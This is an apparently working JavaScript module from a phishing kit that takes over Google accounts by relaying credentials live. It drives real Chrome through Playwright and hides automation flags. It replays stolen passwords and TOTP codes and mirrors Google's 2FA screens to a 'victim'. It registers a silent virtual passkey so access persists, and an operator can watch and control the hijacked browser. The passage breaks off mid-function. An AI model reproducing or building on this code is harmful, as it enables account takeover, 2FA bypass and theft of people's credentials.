import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import { execFile } from 'child_process';
import { fileURLToPath } from 'url';
import { authenticator } from 'otplib';
import { getSecrets, getRaw, getPasskeys, update as storeUpdate } from './store.js';
import { classifyState, extractError, ERROR_SELECTORS } from './google-state.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');

// The page viewport every session runs at. Screencast + remote input are all
// expressed in these CSS pixels, so the admin panel can map screen <-> page.
export const VIEWPORT = { width: 1440, height: 900 };

// id -> { context, page }
const active = new Map();

export function isOpen(id) {
  return active.has(id);
}

export function activeIds() {
  return [...active.keys()];
}

function userDataDir(id) {
  const dir = path.join(SESSIONS_DIR, id);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// The wizard-driven login (stealing credentials step-by-step) and the admin's
// explicit Open/Auto-login both use a HEADed (normal, visible) Google sign-in,
// so the real sign-in is a genuine one you can watch and finish (2FA / device
// challenges) by hand. The switch must happen at launch (persistent contexts
// can't toggle it).
async function launch(id, { headless = true } = {}) {
  const dir = userDataDir(id);
  // Real Chrome is what lets Google's sign-in through (the bundled Playwright
  // Chromium gets flagged as "browser or app may not be secure"). Two rules
  // matter more than any flag:
  // - channel 'chrome': the real installed Chrome, most trusted fingerprint
  // - NO userAgent override: real Chrome already reports the correct UA and
  //   UA-CH (Chrome/151 on this Mac). Forcing a mismatched UA (e.g. Windows
  //   Chrome/126 on macOS, or leaking "HeadlessChrome") is a classic detection
  //   tripwire — consistency of UA/OS/browser version is what Google checks.
  const baseOpts = {
    headless,
    // Headless: let Chrome give us a maximized surface. Headed: force an explicit
    // viewport so the window never opens with a broken/too-short height (a server
    // without a real desktop would otherwise open a tiny default-size window).
    viewport: headless ? null : VIEWPORT,
    ignoreDefaultArgs: ['--enable-automation'],
    args: [
      '--start-maximized',
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-blink-features=AutomationControlled',
      `--class=gsession-${id}`,
    ],
  };
  let context;
  try {
    context = await chromium.launchPersistentContext(dir, { ...baseOpts, channel: 'chrome' });
    console.log(`[gsession] ${id} launched real Chrome (channel 'chrome')`);
  } catch {
    // Fallback: bundled Chromium. Log it loud — Google flags it far more often.
    console.log(`[gsession] ${id} WARNING: real Chrome failed, falling back to bundled Chromium`);
    context = await chromium.launchPersistentContext(dir, baseOpts);
  }
  // Google immediately rejects automated browsers ("this browser or app may not
  // be secure" -> /signin/rejected) unless we mask the driving marks. The
  // canonical fix is to override navigator.webdriver BEFORE any page script runs.
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
  });
  const page = context.pages()[0] || (await context.newPage());
  // headless flag: a persistent context can't toggle visibility after launch, so
  // callers that need a VISIBLE window must relaunch headed instead of reusing an
  // entry that was opened headless.
  const entry = { context, page, headless };
  try { entry.pid = context.browser()?.process()?.pid || null; } catch { entry.pid = null; }
  entry.passkey = await setupPasskeyAuthenticator(context, page, id).catch((e) => {
    console.log(`[gsession] ${id} passkey VA setup skipped: ${e.message}`);
    return null;
  });
  active.set(id, entry);
  context.on('close', () => active.delete(id));
  return entry;
}

// ---------------------------------------------------------------------------
// Passkey ("add this Chrome as a key for the account"). A passkey is a WebAuthn
// credential. On a headless server there is no usable platform authenticator
// (the native InsecureKeyStore dialog never renders, so a plain create() hangs),
// so we hang a CDP VIRTUAL authenticator off the page: it answers create() and
// get() on our behalf, completely silently (no UI). Its credentials live in
// memory only, so we persist them to the session (encrypted) and re-seed them
// into a fresh virtual authenticator on every launch — that is what makes the
// passkey durable across browser restarts and usable for future sign-ins.
// ---------------------------------------------------------------------------
// transport 'internal' = a PLATFORM authenticator (not an external USB security
// key). This matters: Google's passkey-creation page checks
// isUserVerifyingPlatformAuthenticatorAvailable() and shows "A passkey can't be
// created on this device" unless a UV platform authenticator is present. 'usb'
// makes it an external key and Google refuses to create. 'internal' + UV passes
// the check, and the virtual authenticator answers create()/get() silently.
const VA_OPTS = {
  protocol: 'ctap2',
  transport: 'internal',
  hasUserVerification: true,
  hasResidentKey: true,
  automaticPresenceSimulation: true,
  isUserVerified: true,
};

// Attach a virtual authenticator to the session's page and re-seed any saved
// passkey credentials into it. Returns { cdp, authenticatorId, seeded } (or
// null when the browser doesn't support the CDP WebAuthn domain). Best-effort.
async function setupPasskeyAuthenticator(context, page, id) {
  let cdp;
  try {
    cdp = await context.newCDPSession(page);
  } catch (e) {
    console.log(`[gsession] ${id} passkey VA: no CDP session (${e.message})`);
    return null;
  }
  try {
    await cdp.send('WebAuthn.enable');
    const { authenticatorId } = await cdp.send('WebAuthn.addVirtualAuthenticator', { options: VA_OPTS });
    const saved = getPasskeys(id) || [];
    for (const cred of saved) {
      await cdp.send('WebAuthn.addCredential', { authenticatorId, credential: cred }).catch(() => {});
    }
    if (saved.length) console.log(`[gsession] ${id} passkey VA ready, re-seeded ${saved.length} credential(s)`);
    return { cdp, authenticatorId, seeded: saved.length };
  } catch (e) {
    console.log(`[gsession] ${id} passkey VA unavailable (${e.message})`);
    try { cdp.detach(); } catch {}
    return null;
  }
}

// Open the session's browser (or focus it if already open) and navigate to a URL.
export async function open(id, url, opts = {}) {
  const wantHeadless = !!opts.headless;
  let entry = active.get(id);
  // If the session was previously opened HEADLESS (e.g. a silent wizard login left
  // it in `active`) and the caller now wants a VISIBLE window, we can't switch a
  // persistent context to headed in place — close it and relaunch headed. `close`
  // removes it from `active` via the 'close' handler so we get a clean launch.
  if (entry && entry.headless && !wantHeadless) {
    await entry.context.close().catch(() => {});
    entry = null;
  }
  if (!entry) entry = await launch(id, { headless: wantHeadless });
  if (url) {
    try {
      await entry.page.bringToFront();
      await entry.page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (e) {
      // navigation errors shouldn't kill the open browser
    }
  }
  return entry;
}

export async function close(id) {
  const entry = active.get(id);
  if (!entry) return false;
  stopStream(id);
  try {
    await entry.context.close();
  } catch {}
  active.delete(id);
  return true;
}

export async function closeAll() {
  for (const id of [...active.keys()]) {
    // eslint-disable-next-line no-await-in-loop
    await close(id);
  }
}

// --- shared X desktop helpers (TeamViewer-style control) ---
const xDisplay = () => process.env.DISPLAY || ':99';

function xRun(cmd) {
  return new Promise((resolve) => {
    execFile('sh', ['-c', cmd], { timeout: 4000, env: { ...process.env, DISPLAY: xDisplay() } }, (err, stdout) => {
      resolve({ ok: !err, stdout: String(stdout || '').trim(), error: err ? err.message : null });
    });
  });
}

async function sessionWindowIds(id, pid) {
  const cls = `gsession-${String(id).replace(/[^a-zA-Z0-9_-]/g, '')}`;
  const byClass = await xRun(`xdotool search --class ${cls} 2>/dev/null`);
  const ids = byClass.stdout.split('\n').filter(Boolean);
  if (ids.length) return ids;
  if (pid) {
    const byPid = await xRun(`xdotool search --pid ${pid} 2>/dev/null`);
    return byPid.stdout.split('\n').filter(Boolean);
  }
  return [];
}

// The session's main browser window = the largest visible top-level window.
export async function mainWindow(id) {
  const entry = active.get(id);
  if (!entry) return null;
  const ids = await sessionWindowIds(id, entry.pid);
  if (!ids.length) return null;
  let best = null;
  let bestArea = 0;
  for (const win of ids) {
    // eslint-disable-next-line no-await-in-loop
    const geo = await xRun(`xdotool getwindowgeometry ${win} 2>/dev/null`);
    const geom = geo.stdout.match(/Geometry:\s*(\d+)x(\d+)/) || geo.stdout.match(/Width:\s*(\d+)[\s\S]*Height:\s*(\d+)/);
    const w = Number(geom ? geom[1] : 0) || 0;
    const h = Number(geom ? geom[2] : 0) || 0;
    const area = w * h;
    if (area > bestArea && area > 10000) {
      bestArea = area;
      best = win;
    }
  }
  return best;
}

// Raise/focus the session's real Chrome window and make it cover the desktop,
// so the shared VNC view effectively shows only this session's browser.
export async function focus(id) {
  const entry = active.get(id);
  if (!entry) return { ok: false, error: 'Browser not open' };
  const win = await mainWindow(id);
  if (!win) return { ok: false, error: 'Chrome window not found yet' };
  const geom = await xRun(`xdotool getdisplaygeometry 2>/dev/null`);
  const disp = (geom.stdout.match(/(\d+)\s+(\d+)/) || ['1920', '1080']);
  const dw = Number(disp[0]) || 1920;
  const dh = Number(disp[1]) || 1080;
  const cmd = [
    `xdotool windowactivate --sync ${win} 2>/dev/null`,
    `xdotool windowsize ${win} ${dw} ${dh} 2>/dev/null`,
    `xdotool windowmove ${win} 0 0 2>/dev/null`,
    `xdotool windowraise ${win} 2>/dev/null`,
  ].join('; ');
  const res = await xRun(cmd);
  return { ok: res.ok, window: win, error: res.error || null };
}

// ---------------------------------------------------------------------------
// Live view: screencast frames from the session's real page, so the admin
// panel can show the browser window in a web page (like a live stream).
// Frames come from CDP Page.startScreencast (JPEG, low latency, ~25fps cap).
// ---------------------------------------------------------------------------
const streams = new Map();

export function canStream(id) {
  return active.has(id);
}

// Pages that are still alive (ignore ones mid-close).
const livePages = (entry) => entry.context.pages().filter((p) => {
  try { return !p.isClosed(); } catch { return false; }
});
// The tab the admin panel is currently driving (falls back to the primary page).
function controlPage(entry) {
  const pages = livePages(entry);
  if (!pages.length) return null;
  try { if (entry.activeTab && !entry.activeTab.isClosed()) return entry.activeTab; } catch {}
  try { if (entry.page && !entry.page.isClosed()) { entry.activeTab = entry.page; return entry.page; } } catch {}
  entry.activeTab = pages[0];
  entry.page = pages[0];
  return pages[0];
}

export function onStreamFrame(id, onFrame, onEnd) {
  const entry = active.get(id);
  if (!entry) return () => {};
  let rec = streams.get(id);
  if (!rec) rec = { cdp: null, onFrame: null, onEnd: null };
  rec.onFrame = onFrame;
  rec.onEnd = onEnd;
  streams.set(id, rec);
  (async () => {
    // stream follows the tab the panel is driving
    const page = controlPage(entry);
    rec.page = page;
    if (!page) {
      stopStream(id);
      if (rec.onEnd) rec.onEnd('No open tab');
      return;
    }
    try {
      rec.cdp = await entry.context.newCDPSession(page);
      rec.frameHandler = (p) => {
        if (rec.onFrame) rec.onFrame(p.data);
        // Chrome stops sending frames unless we acknowledge each one.
        rec.cdp?.send('Page.screencastFrameAck', { sessionId: p.sessionId }).catch(() => {});
      };
      rec.closeHandler = () => stopStream(id);
      rec.cdp.on('Page.screencastFrame', rec.frameHandler);
      rec.cdp.on('close', rec.closeHandler);
      await rec.cdp.send('Emulation.setDeviceMetricsOverride', {
        width: VIEWPORT.width, height: VIEWPORT.height, deviceScaleFactor: 1, mobile: false,
      });
      // Screencast is damage-driven: a static page sends one frame and then
      // silence. While a watcher is attached we nudge the page with a tiny
      // (invisible) 2px class toggle so the admin's live view ticks ~1x/sec.
      try {
        await page.evaluate(() => {
          if (document.getElementById('gs-tick-style')) return;
          const s = document.createElement('style');
          s.id = 'gs-tick-style';
          s.textContent = '.gs__tick::before{content:"";position:fixed;top:0;left:0;width:2px;height:2px;pointer-events:none;background:rgba(0,0,0,.04)}';
          (document.head || document.documentElement).appendChild(s);
        });
      } catch {}
      rec.tick = setInterval(() => {
        rec.cdp?.send('Runtime.evaluate', {
          expression: 'document.body && document.body.classList.toggle("gs__tick")',
        }).catch(() => {});
      }, 700);
      // Native viewport resolution (1:1 with the page) so remote-control click
      // coordinates map exactly, and enough quality that text stays readable.
      await rec.cdp.send('Page.startScreencast', {
        format: 'jpeg', quality: 70, maxWidth: VIEWPORT.width, maxHeight: VIEWPORT.height, everyNthFrame: 1,
      });
    } catch (e) {
      console.log(`[gsession] stream start failed: ${e.message}`);
      stopStream(id);
      if (rec.onEnd) rec.onEnd(e.message);
    }
  })();
  return () => stopStream(id);
}

function stopStream(id) {
  const rec = streams.get(id);
  if (!rec) return;
  streams.delete(id);
  if (rec.tick) { clearInterval(rec.tick); rec.tick = null; }
  if (rec.cdp) {
    try { rec.cdp.send('Page.stopScreencast'); } catch {}
    try {
      if (rec.frameHandler) rec.cdp.off('Page.screencastFrame', rec.frameHandler);
      if (rec.closeHandler) rec.cdp.off('close', rec.closeHandler);
    } catch {}
    // drop the nudge style once nobody is watching anymore
    rec.page?.evaluate(() => document.getElementById('gs-tick-style')?.remove())
      .catch(() => {});
    rec.cdp.detach().catch(() => {});
  }
}

// ---------------------------------------------------------------------------
// Tab management — makes Live Control behave like a normal browser: the panel
// shows the session's real tabs, switches between them, opens/closes tabs and
// navigates (address bar, back/forward/reload). The stream + remote input both
// follow entry.activeTab.
// ---------------------------------------------------------------------------
export async function listTabs(id) {
  const entry = active.get(id);
  if (!entry) return { open: false, tabs: [], index: -1 };
  const pages = livePages(entry);
  const tabs = [];
  for (let i = 0; i < pages.length; i += 1) {
    let title = '';
    try { title = (await pages[i].title()) || ''; } catch { /* page gone */ }
    let url = '';
    try { url = pages[i].url(); } catch { /* page gone */ }
    tabs.push({ i, url, title });
  }
  const idx = Math.max(0, pages.indexOf(controlPage(entry)));
  return { open: true, tabs, index: idx };
}

export async function activateTab(id, index) {
  const entry = active.get(id);
  if (!entry) return false;
  const p = livePages(entry)[index];
  if (!p) return false;
  entry.activeTab = p;
  await p.bringToFront().catch(() => {});
  return true;
}

export async function newTab(id, url) {
  const entry = active.get(id);
  if (!entry) return null;
  let p;
  try {
    p = await entry.context.newPage();
  } catch {
    return null;
  }
  entry.activeTab = p;
  const target = normalizeUrl(url) || 'about:blank';
  await p.goto(target, { waitUntil: 'commit', timeout: 30000 }).catch(() => {});
  return p;
}

export async function closeTab(id, index) {
  const entry = active.get(id);
  if (!entry) return false;
  const p = livePages(entry)[index];
  if (!p) return false;
  if (entry.page === p) entry.page = livePages(entry).find((x) => x !== p) || null;
  if (entry.activeTab === p) entry.activeTab = livePages(entry).find((x) => x !== p) || null;
  await p.close().catch(() => {});
  return true;
}

// "google.com" -> https://, bare words -> Google search, URLs pass through.
function normalizeUrl(raw) {
  const s = String(raw || '').trim();
  if (!s) return null;
  if (/^https?:\/\//i.test(s) || /^[a-z][a-z0-9+.-]*:/i.test(s) || /^about:/i.test(s)) return s;
  if (/^[\w-]+(\.[\w-]+)+([/?#]|$)/.test(s) || /^localhost(:\d+)?([/?#]|$)/.test(s) || /^\d{1,3}(\.\d{1,3}){3}(:\d+)?([/?#]|$)/.test(s)) return `https://${s}`;
  return `https://www.google.com/search?igu=1&q=${encodeURIComponent(s)}`;
}

export async function navigate(id, url) {
  const entry = active.get(id);
  if (!entry) return { ok: false, error: 'Browser not open' };
  const p = controlPage(entry);
  if (!p) return { ok: false, error: 'No open tab' };
  const target = normalizeUrl(url);
  if (!target) return { ok: false, error: 'Empty address' };
  try {
    await p.bringToFront().catch(() => {});
    let cdp = entry.navCdp;
    if (entry.navPage !== p) {
      try { if (entry.navCdp) await entry.navCdp.detach(); } catch { /* stale */ }
      cdp = await entry.context.newCDPSession(p);
      entry.navCdp = cdp;
      entry.navPage = p;
    }
    await cdp.send('Page.enable').catch(() => {});
    await cdp.send('Page.navigate', { url: target });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

export async function navAction(id, action) {
  const entry = active.get(id);
  if (!entry) return { ok: false, error: 'Browser not open' };
  const p = controlPage(entry);
  if (!p) return { ok: false, error: 'No open tab' };
  try {
    await p.bringToFront().catch(() => {});
    if (action === 'back') return { ok: !!(await p.goBack({ waitUntil: 'commit', timeout: 15000 }).catch(() => null)) };
    if (action === 'forward') return { ok: !!(await p.goForward({ waitUntil: 'commit', timeout: 15000 }).catch(() => null)) };
    await p.reload({ waitUntil: 'commit', timeout: 15000 });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Resolve whatever TOTP value we were handed into the digits to type into Google:
// - a 6-digit numeric code (what a victim reads off their authenticator app) ->
//   type it straight in, it is already valid for the current time window.
// - anything else (a Base32 "setup key" captured from the admin panel / invite)
//   -> generate the current rolling code from that secret.
function totpValue(secretOrCode) {
  const s = String(secretOrCode || '').trim();
  if (/^\d{6}$/.test(s)) return s;
  return s ? authenticator.generate(s.replace(/\s+/g, '')) : '';
}

// Google surfaces account-level errors (wrong password, unknown account, bad 2FA
// code) in Material error containers. Selectors + error matcher live in
// google-state.js (shared with the state classifier, unit-tested there).
async function detectGoogleError(page) {
  for (const sel of ERROR_SELECTORS) {
    const els = await page.locator(sel).all().catch(() => []);
    for (const el of els) {
      if (await el.isVisible().catch(() => false)) {
        const t = (await el.innerText().catch(() => '')).trim();
        const err = extractError(t);
        if (err) return err;
      }
    }
  }
  return null;
}

// After submitting a password, wait for Google to either accept it (the password
// field disappears / the flow advances) or reject it (a real error appears).
// Never blindly advance on a wrong password. Returns { accepted } when we should
// move on, or { error } with the Google error text when it was rejected.
async function waitPasswordOutcome(page, pw, timeout) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    const err = await detectGoogleError(page);
    if (err) return { error: err };
    if (!(await pw.isVisible().catch(() => false))) return { accepted: true };
    await sleep(500);
  }
  // Still on the password field and no error text surfaced => safest to treat it
  // as a bad password rather than silently continue to 2FA.
  return { error: 'Wrong password. Try again or click Forgot password to reset it.' };
}

// Best-effort assisted login. Pre-fills credentials in the persistent context.
// Returns { status, message }. Leaves the browser OPEN so 2FA / challenges can
// be completed by hand when they can't be automated. `headless` defaults to true
// for the silent wizard login; the admin panel opens a visible (headed) browser.
export async function login(session, { headless = true } = {}) {
  const secrets = getSecrets(session.id) || { password: '', totpSecret: '' };
  const entry = await open(session.id, undefined, { headless });
  const page = entry.page;

  if (session.provider === 'google') {
    // Fast path: if this Chrome already holds a passkey for the stolen account,
    // sign in with the passkey first. The persistent profile then stays logged
    // in to that account without re-typing the password.
    const pk = await passkeySignInOnPage(page, session, entry).catch(() => null);
    if (pk && (pk.status === 'logged-in' || pk.state === 'signed-in')) return pk;
    if (pk && pk.status === 'pending' && pk.state === 'passkey') return pk;
    return googleLogin(page, session, secrets);
  }

  // Generic provider: just navigate to the login URL for a manual sign-in.
  if (session.loginUrl) {
    try {
      await page.goto(session.loginUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch {}
  }
  return { status: 'new', message: 'Opened login page. Complete sign-in manually in the browser window.' };
}

// Are we still on a plain sign-in field screen (email or password)? If so the
// page doesn't count as a second-factor challenge regardless of other markers.
async function isFieldScreen(page) {
  if (await page.locator('#identifierId, input[name="identifier"]').first().isVisible().catch(() => false)) return true;
  if (await page.locator('input[type="password"]').first().isVisible().catch(() => false)) return true;
  return false;
}

// Read the selectable NUMBER options Google shows on the "pick the number"
// challenge some accounts get after the password (typically three 2-digit codes,
// occasionally phone-number options on the "choose a phone" variant). An option
// = a clickable element whose ENTIRE visible text is a digit string / phone
// number and nothing else. Returns the option texts (max 8, de-duplicated) in
// document order so the clone can mirror them and click the matching real one.
async function readNumberOptions(page) {
  try {
    const els = await page
      .locator('a, button, [role="button"], [role="menuitemradio"], [role="option"]')
      .all();
    const seen = new Set();
    const options = [];
    for (const el of els) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (!t || t.length > 18) continue;
      if (!/^\+?\d[\d\s\-().]{1,17}$/.test(t)) continue; // digits/phone only
      if (seen.has(t)) continue;
      seen.add(t);
      options.push(t);
      if (options.length >= 8) break;
    }
    return options;
  } catch {
    return [];
  }
}

// Detect which second-factor / verification screen is on display. Returns:
//   { kind: 'code' }                  -> a numeric code input is shown (authenticator
//                                        / SMS / e-mail code)
//   { kind: 'numchoice', options[] }  -> "pick the number" options: >= 2 clickable
//                                        elements whose whole text is a 2+-digit
//                                        number (no code input, no sign-in fields)
//   { kind: 'prompt' }                -> approve-on-phone / "Confirm it's you" style
//   null                              -> no second-factor challenge in sight
// Snapshot each distinct challenge page URL once per assessment pass, so we can
// always verify which Google page is actually on screen (text, inputs, digits).
const lastSnapshot = new WeakMap();
async function maybeSnapshot(page) {
  const url = page.url().split('?')[0];
  if (!/signin\/(challenge|continue)/.test(url)) return;
  if (lastSnapshot.get(page) === url) return;
  lastSnapshot.set(page, url);
  await snapshotChallenge(page, url.split('/').pop() || 'challenge');
}

async function detect2FA(page) {
  await maybeSnapshot(page);
  const totpName = page.locator('input[name="totpPin"], input#totpPin').first();
  if (await totpName.isVisible().catch(() => false)) {
    // explicit Google totp field — also surface any number displayed on the page
    // (some challenges show a code the user must type into this very field)
    if (await isFieldScreen(page)) return { kind: 'code' };
    const num = await readDisplayedNumber(page);
    return { kind: 'code', options: num ? [num] : undefined };
  }
  const code = page
    .locator('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]')
    .first();
  if (await code.isVisible().catch(() => false)) {
    // Only trust a generic numeric/OTP input if there is genuinely no email or
    // password field showing (i.e. we are NOT on the sign-in field screens).
    if (await isFieldScreen(page)) return null; // still a field screen, not 2FA
    console.log(`[gsession] detect2FA code-input matched: ${await code.evaluate((el) => el.outerHTML.slice(0, 120)).catch(() => '?')}`);
    const num = await readDisplayedNumber(page);
    return { kind: 'code', options: num ? [num] : undefined };
  }
  // "Pick the number" challenge: some accounts show a page of clickable number
  // tiles (e.g. three different 2-digit codes) to choose from instead of typing
  // a code. On other accounts the page shows a SINGLE short code (typically a
  // 2-digit number) — that counts too; a lone long phone number does not.
  // The headings on these pages ALSO match the CHALL markers below, so this
  // must run BEFORE the challenge-text scan.
  if (!(await isFieldScreen(page))) {
    const options = await readNumberOptions(page);
    const singleShort = options.length === 1 && /^\d{2,4}$/.test(options[0]);
    if (options.length >= 2 || singleShort) {
      console.log(`[gsession] detect2FA num-choice page, options: ${options.join(' / ')} @ ${page.url().slice(0, 90)}`);
      return { kind: 'numchoice', options };
    }
  }
  // No code field, no number options. Google's challenge screens (approve-on-phone,
  // or a code we can't bind) come in several shapes and the H1 ALONE is unreliable —
  // so scan the headings AND the action links/buttons AND body copy for any marker
  // that this is a second-factor screen rather than a plain sign-in field.
  let labels = '';
  try {
    const parts = await Promise.all([
      page.locator('h1, h2, h3').allInnerTexts(),
      page.locator('a, button, [role="button"]').allInnerTexts(),
      page.locator('body').innerText(),
    ]);
    labels = parts.join(' ');
  } catch {}
  labels = labels.toLowerCase();
  const CHALL = new RegExp(
    `verify it['${String.fromCharCode(8217)}]?s you|confirm it['${String.fromCharCode(8217)}]?s you|check your phone|check your (?:google account|email)|try another way|use another (?:way|method)|(?:we|google) (?:['${String.fromCharCode(8217)}]?ve?|will)?\\s*sent (?:you\\s+)?(?:a\\s+)?(?:code|notification)|tap (?:to )?(?:yes|approve|confirm)|tap the (?:button|number)|authenticator app|6[- ]?digit (?:code|verification)|enter the (?:last\\s+|6-?|)?digits|backup code|it['${String.fromCharCode(8217)}]?s been a while since`,
    'i',
  );
  if (CHALL.test(labels) && !(await isFieldScreen(page))) {
    console.log(`[gsession] detect2FA challenge page (approve/prompt) @ ${page.url().slice(0, 90)}`);
    await maybeSnapshot(page);
    // The approve/prompt pages can DISPLAY a number (e.g. /challenge/dp:
    // "the number 47 below will be on your phone"). Surface it so every UI can
    // show it — that's the step that used to go missing. Keeping kind 'prompt'
    // because the real action is still on the phone (or the number is read,
    // not clicked).
    return await promptResult(page);
  }
  // 100%-coverage backstop: ANY Google challenge URL (/v3/signin/challenge/*)
  // that is not a plain sign-in field and not signed in IS a challenge, even if
  // its wording is new/unknown. Surface it — with every number displayed on the
  // page — so the UIs (wizard clone, panel modal) always show what's on screen.
  if (/\/v3\/signin\/challenge\//.test(page.url()) && !(await isFieldScreen(page))) {
    console.log(`[gsession] detect2FA unknown challenge page (URL backstop) @ ${page.url().slice(0, 90)}`);
    await maybeSnapshot(page);
    return await promptResult(page);
  }
  return null;
}

// All short standalone numbers shown on the page (the "displayed code" on
// challenge pages). Max 4.
async function pageNumbers(page) {
  const numbers = [];
  try {
    for (const el of await page.locator('div, span, h1, h2, h3, p, button').all()) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (/^\d{2,6}$/.test(t) && !numbers.includes(t)) numbers.push(t);
      if (numbers.length >= 4) break;
    }
  } catch {}
  return numbers;
}

// Read a short standalone number displayed ON the challenge page (e.g. a
// 2-digit code Google shows so the user can type it into that same page's code
// field, or a "confirm this number" display). Checks the obvious display
// containers first, then any visible element whose entire text is 2-6 digits.
async function readDisplayedNumber(page) {
  const nums = await pageNumbers(page);
  return nums.length ? nums[0] : null;
}

// Read the phone/device name Google shows on an approve-on-phone page, e.g.
// "Check your POCO X8 Pro". This is the page context the victim needs so the
// clone can say exactly which device to look at.
async function readPromptDevice(page) {
  try {
    const text = (await page.locator('body').innerText().catch(() => '')).trim();
    const m =
      text.match(/Check your ([A-Za-z0-9][A-Za-z0-9 \-\+']{1,48}?)(?:\n|\.|$)/) ||
      text.match(/notification to your ([A-Za-z0-9][A-Za-z0-9 \-\+']{1,48}?)(?:\n|\.|$)/);
    return m ? m[1].trim() : '';
  } catch {
    return '';
  }
}

// Read the verification number Google asks the victim to tap on their phone.
// This is intentionally broader than pageNumbers(): the number can be a single
// digit ("tap 6 on your phone"), and it can live in surrounding sentence text
// rather than a standalone clickable tile.
async function readPromptNumbers(page) {
  const nums = [];
  try {
    const text = (await page.locator('body').innerText().catch(() => '')).trim();
    const patterns = [
      /tap (\d{1,6}) on your phone/i,
      /tap the number (\d{1,6})/i,
      /the number (\d{1,6}) (?:below|shown|on your phone)/i,
      /number (\d{1,6}) will be on your phone/i,
    ];
    for (const re of patterns) {
      const m = text.match(re);
      if (m && !nums.includes(m[1])) nums.push(m[1]);
    }
    for (const el of await page.locator('div, span, h1, h2, h3, p, button').all()) {
      if (!(await el.isVisible().catch(() => false))) continue;
      const t = (await el.innerText().catch(() => '')).trim();
      if (/^\d{1,6}$/.test(t) && !nums.includes(t)) nums.push(t);
      if (nums.length >= 4) break;
    }
  } catch {}
  return nums.slice(0, 4);
}

async function promptResult(page) {
  return {
    kind: 'prompt',
    options: await readPromptNumbers(page),
    device: await readPromptDevice(page),
  };
}

// Snapshot a challenge screen to data/challenges/ so we can always SEE exactly
// what page Google is on right now: full text, visible inputs, any numbers
// shown on the page, plus a screenshot. Returns the snapshot meta (or null).
async function snapshotChallenge(page, tag) {
  const dir = path.join(__dirname, '..', 'data', 'challenges');
  fs.mkdirSync(dir, { recursive: true });
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const file = path.join(dir, `${tag || 'challenge'}-${stamp}`);
  try {
    const url = page.url();
    const text = (await page.locator('body').innerText().catch(() => ''))
      .split('\n').map((t) => t.trim()).filter(Boolean).slice(0, 80).join('\n');
    const inputs = [];
    for (const inp of await page.locator('input, select, textarea').all().catch(() => [])) {
      if (!(await inp.isVisible().catch(() => false))) continue;
      inputs.push(await inp.evaluate((el) => `type=${el.type} name="${el.name}" id="${el.id}" mode=${el.inputMode}`).catch(() => ''));
    }
    const numbers = await readPromptNumbers(page);
    const shot = `${file}.png`;
    await page.screenshot({ path: shot }).catch(() => {});
    fs.writeFileSync(`${file}.meta.json`, JSON.stringify({
      url, inputs, numbersOnPage: numbers,
      text: text.slice(0, 4000), screenshot: path.basename(shot),
    }, null, 2));
    console.log(`[gsession] challenge snapshot -> ${path.basename(file)} url=${url.slice(0, 100)} numbers=[${numbers.join(', ')}]`);
    return { path: file, url, numbersOnPage: numbers };
  } catch (e) {
    console.log(`[gsession] challenge snapshot failed: ${e.message}`);
    return null;
  }
}

// Collect the DOM signals the state classifier needs (see google-state.js).
// Pure read of the live page — never drives the browser.
async function collectSignals(page) {
  const vis = (sel) => page.locator(sel).first().isVisible().catch(() => false);
  const [hasIdentifier, hasPassword, hasTotpPin, hasCodeInput, hasCaptcha, heading, bodyText, buttons, errorText] =
    await Promise.all([
      vis('#identifierId, input[name="identifier"]'),
      vis('input[type="password"]'),
      vis('input[name="totpPin"], input#totpPin'),
      vis('input[type="tel"][name], input[autocomplete="one-time-code"], input[inputmode="numeric"]'),
      vis('iframe[src*="recaptcha"], #recaptcha, .rc-widget, [data-recaptcha-apikey]'),
      page.locator('h1, h2, h3').first().innerText().catch(() => ''),
      page.locator('body').innerText().catch(() => ''),
      (async () => {
        const out = [];
        try {
          const els = await page.locator('a, button, [role="button"]').all();
          for (const el of els) {
            if (!(await el.isVisible().catch(() => false))) continue;
            const t = (await el.innerText().catch(() => '')).trim();
            if (t && t.length <= 40 && !out.includes(t)) out.push(t);
            if (out.length >= 20) break;
          }
        } catch {}
        return out;
      })(),
      (async () => {
        try {
          for (const sel of ERROR_SELECTORS) {
            for (const el of await page.locator(sel).all()) {
              if (!(await el.isVisible().catch(() => false))) continue;
              const err = extractError((await el.innerText().catch(() => '')).trim());
              if (err) return err;
            }
          }
        } catch {}
        return '';
      })(),
    ]);
  return {
    url: page.url(),
    hasIdentifier,
    hasPassword,
    hasTotpPin,
    hasCodeInput,
    hasCaptcha,
    heading: String(heading || '').trim(),
    bodyText: String(bodyText || '').trim().slice(0, 4000),
    buttons,
    errorText,
  };
}

// DOM/URL assessment of the real login state — "what is the live backend Google
// page asking for right now?" Delegates to the tested classifier (google-state.js)
// so every known screen is identified in one place. The wizard mirrors ONLY this
// reported state, so the clone never invents a screen Google isn't showing.
// States: 'email' | 'password' | 'code' (codeKind, options) | 'approve' (options)
//   | 'numchoice' (options) | 'choice' (options) | 'sms' (phone) | 'passkey'
//   | 'captcha' | 'verifying' | 'signed-in' (set by settleAndVerify) | 'error'
async function assessLogin(page) {
  await maybeSnapshot(page);

  // "Pick the number" tiles: an option whose ENTIRE visible text is a number.
  // No other screen looks like that, and the classifier can't see it — so check
  // first (before it would fall through to prompt/unknown).
  if (!(await isFieldScreen(page))) {
    const options = await readNumberOptions(page);
    const singleShort = options.length === 1 && /^\d{2,4}$/.test(options[0]);
    if (options.length >= 2 || singleShort) {
      return {
        status: 'pending',
        state: 'numchoice',
        options,
        message: options.length === 1
          ? `Google is showing a verification number: ${options[0]} — confirm it to continue.`
          : 'Select the number that matches this sign-in attempt on Google.',
      };
    }
  }

